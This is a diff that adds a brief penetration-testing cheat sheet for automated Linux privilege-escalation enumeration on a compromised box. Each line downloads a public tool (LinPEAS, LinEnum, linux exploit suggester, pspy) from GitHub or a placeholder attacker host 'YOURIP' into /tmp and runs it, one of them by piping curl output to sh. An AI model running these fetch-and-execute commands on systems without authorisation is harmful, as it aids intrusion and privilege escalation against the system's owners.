@@ -1,0 +1,13 @@
+AUTOMATED ENUM (run first on box)
+bash# LinPEAS (best)
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+wget YOURIP/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh
+
+# LinEnum
+wget YOURIP/LinEnum.sh -O /tmp/le.sh && chmod +x /tmp/le.sh && /tmp/le.sh
+
+# LES (linux exploit suggester)
+wget YOURIP/les.sh -O /tmp/les.sh && bash /tmp/les.sh
+
+# pspy (watch cronjobs/processes without root)
+wget YOURIP/pspy64 -O /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy
